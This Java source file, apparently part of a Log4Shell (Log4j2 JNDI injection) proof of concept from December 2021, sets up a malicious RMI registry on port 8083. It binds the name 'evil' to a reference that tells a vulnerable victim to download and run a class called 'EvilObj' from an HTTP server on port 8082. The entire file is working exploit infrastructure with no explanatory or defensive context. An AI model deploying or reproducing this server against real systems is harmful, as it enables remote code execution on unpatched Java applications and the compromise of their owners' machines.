package Log4J2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author: 乌鸦坐飞机亠
 * @date: 2021/12/10 21:53
 * @Description:
 */
public class Register {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(8083);
        String url = "http://127.0.0.1:8082/";
        System.out.println("Create RMI registry on port ");
        Reference reference = new Reference("EvilObj", "EvilObj", url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("evil", referenceWrapper);
    }
}
